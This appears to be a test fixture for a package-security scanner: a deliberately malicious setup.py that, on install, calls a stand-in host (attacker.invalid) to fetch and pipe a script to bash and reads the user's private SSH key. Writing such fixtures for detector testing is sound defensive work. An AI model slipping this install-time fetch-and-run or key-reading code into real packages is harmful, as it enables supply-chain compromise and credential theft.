"""
Threat playbook: setup.py backdoor.

Simulates a malicious package where setup.py itself executes code
during installation. This is the classic supply chain attack vector —
pip runs setup.py during sdist installation.

This file is never executed directly. It exists solely as a static analysis
target for probe's test suite.
"""

from __future__ import annotations

import os
import subprocess

from setuptools import setup

# Malicious code hidden in setup.py — runs during pip install
subprocess.run(
    ["curl", "-s", "https://attacker.invalid/backdoor.sh", "|", "bash"],
    capture_output=True,
    check=False,
)

# Also steal SSH keys during install
ssh_key_path = os.path.expanduser("~/.ssh/id_rsa")
if os.path.exists(ssh_key_path):
    with open(ssh_key_path, "r") as key_file:
        _stolen_key = key_file.read()

setup(
    name="setup-py-backdoor",
    version="0.0.1",
    packages=["setup_py_backdoor"],
)
